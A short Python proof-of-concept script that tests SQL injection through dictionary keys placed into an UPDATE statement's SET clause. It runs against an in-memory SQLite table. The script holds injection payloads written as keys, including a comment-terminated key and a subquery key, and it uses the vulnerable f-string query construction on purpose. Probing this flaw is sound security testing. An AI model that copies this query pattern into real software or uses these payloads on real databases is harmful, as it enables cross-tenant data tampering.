import sqlite3

db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE test (id TEXT PRIMARY KEY, tenant TEXT, project_id TEXT, secret TEXT)")
db.execute("INSERT INTO test (id, tenant, project_id, secret) VALUES ('1', 't1', 'p1', 'safe')")
db.execute("INSERT INTO test (id, tenant, project_id, secret) VALUES ('2', 't2', 'p2', 'safe2')")

updates = {"secret": "hacked"}
# How to bypass?
# UPDATE test SET secret = ? WHERE id = ? AND tenant = ? AND project_id = ?
# What if we pass key `secret = 'hacked' --`?
# "secret = 'hacked' --" : "value"
updates = {"secret = 'hacked' --": "value"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
query = f"UPDATE test SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
# query becomes: UPDATE test SET secret = 'hacked' -- = ? WHERE ...
# which is syntax error because `--` comments out the rest, but SQLite sees `= ?` inside the comment and thinks there is 1 less parameter?
# Actually, the parameter binding for `value` will be unmatched because it is commented out.

updates = {"secret = (SELECT 'hacked')": "value"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
query = f"UPDATE test SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
print(f"Query: {query}")
try:
    db.execute(query, list(updates.values()) + ['1', 't1', 'p1'])
    print("Execution successful")
except Exception as e:
    print(f"Error: {e}")
